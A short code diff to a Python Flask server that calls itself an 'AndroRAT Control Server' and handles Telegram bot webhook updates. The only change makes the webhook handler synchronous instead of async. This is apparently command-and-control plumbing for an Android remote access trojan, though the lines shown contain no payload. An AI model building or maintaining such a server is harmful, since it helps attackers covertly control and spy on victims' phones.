@@ -661,7 +661,7 @@ def index():
     return "AndroRAT Control Server is running! 🎮"
 
 @app.route('/webhook', methods=['POST'])
-async def webhook():
+def webhook():
     """استقبال تحديثات تيليجرام عبر Webhook"""
     try:
         update = Update.de_json(request.get_json(force=True), telegram_app.bot)
